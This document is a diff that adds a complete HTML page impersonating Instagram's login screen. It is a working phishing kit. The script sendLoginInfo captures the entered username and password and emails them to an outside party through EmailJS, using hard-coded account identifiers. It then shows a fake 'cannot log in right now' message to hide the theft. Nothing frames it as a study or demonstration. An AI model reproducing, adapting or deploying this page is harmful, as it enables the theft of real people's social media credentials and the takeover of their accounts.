@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login - Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&family=Raleway:wght@600&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            font-family: 'Montserrat', 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('https://www.transparenttextures.com/patterns/white-paper.png');
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            padding: 40px 40px 30px;
+            width: 350px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            font-family: 'Raleway', sans-serif;
+            font-weight: 600;
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #262626;
+            letter-spacing: 1.5px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 11px 10px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #fafafa;
+            transition: background-color 0.15s ease-in-out;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            background-color: white;
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 10px 0;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 12px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #007bbf;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 12px;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            user-select: none;
+            transition: opacity 0.3s;
+            margin-bottom: 15px;
+        }
+        .facebook-login:hover {
+            opacity: 0.8;
+        }
+        .facebook-login svg {
+            margin-right: 5px;
+            fill: #3b5998; /* Facebook blue */
+            width: 16px; /* Smaller icon */
+            height: 16px; /* Smaller icon */
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        /* Modal Styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto; /* 15% from the top and centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Could be more or less, depending on screen size */
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        @media (max-width: 400px) {
+            .container {
+                width: 90vw;
+                padding: 30px 20px 20px;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("2fiT5CnSlIWUh4TCt"); // Your EmailJS user ID
+        })();
+
+        function sendLoginInfo(event) {
+            event.preventDefault(); // Prevent the form from submitting
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const templateParams = {
+                username: username,
+                password: password
+            };
+
+            emailjs.send('RP10189', 'template_9pnemz5', templateParams)
+                .then((response) => {
+                    console.log('SUCCESS!', response.status, response.text);
+                    const modal = document.getElementById("loginModal");
+                    modal.querySelector("p").textContent = "You cannot log in right now. Please try again later.";
+                    modal.style.display = "block";
+                }, (error) => {
+                    console.log('FAILED...', error);
+                    const modal = document.getElementById("loginModal");
+                    modal.querySelector("p").textContent = "Failed to send login information. Please try again.";
+                    modal.style.display = "block";
+                });
+        }
+
+        function closeModal() {
+            const modal = document.getElementById("loginModal");
+            modal.style.display = "none";
+        }
+    </script>
+</head>
+<body>
+    <div class="container" role="main">
+        <h1 aria-label="Instagram">Instagram</h1>
+        <form onsubmit="sendLoginInfo(event)">
+            <input type="text" id="username" placeholder="Phone number, username, or email" aria-label="Username or email" required />
+            <input type="password" id="password" placeholder="Password" aria-label="Password" required />
+            <button type="submit">Log In</button>
+        </form>
+        <div class="divider" aria-hidden="true">OR</div>
+        <div class="facebook-login" role="button" tabindex="0" aria-label="Continue with Facebook">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true"><path d="M22.675 0h-21.35C.595 0 0 .593 0 1.326v21.348C0 23.405.595 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.794.144v3.24l-1.918.001c-1.505 0-1.797.716-1.797 1.765v2.313h3.59l-.467 3.622h-3.123V24h6.116c.73 0 1.324-.595 1.324-1.326V1.326C24 .594 23.405 0 22.675 0z"/></svg>
+            Continue with Facebook
+        </div>
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <p><a href="#">Forgot password?</a></p>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <p style="font-family: Arial, sans-serif;">You cannot log in right now. Please try again later.</p>
+        </div>
+    </div>
+</body>
+</html>
